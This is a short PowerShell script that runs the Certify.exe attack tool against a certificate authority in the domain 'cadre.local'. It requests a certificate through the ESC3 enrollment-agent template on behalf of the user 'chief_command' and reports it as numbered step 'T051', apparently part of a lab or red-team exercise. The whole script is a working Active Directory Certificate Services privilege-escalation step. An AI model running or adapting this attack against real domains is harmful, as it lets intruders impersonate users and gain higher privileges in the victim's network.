[CmdletBinding()]
param()
$ErrorActionPreference = "Stop"
$c = "C:\Tools\cadre-attack\Certify.exe"
if (-not (Test-Path $c)) { throw "Certify.exe not found" }
& $c request /ca:"CADRE-CA-01.cadre.local\CADRE-CA-01" /template:ESC3EnrollmentAgent /domain:"cadre.local" /dc:"dc01.cadre.local" /user:chief_command /onbehalfof:CADRE\chief_command
Write-Output "T051_OK: ESC3 enrollment agent request complete"
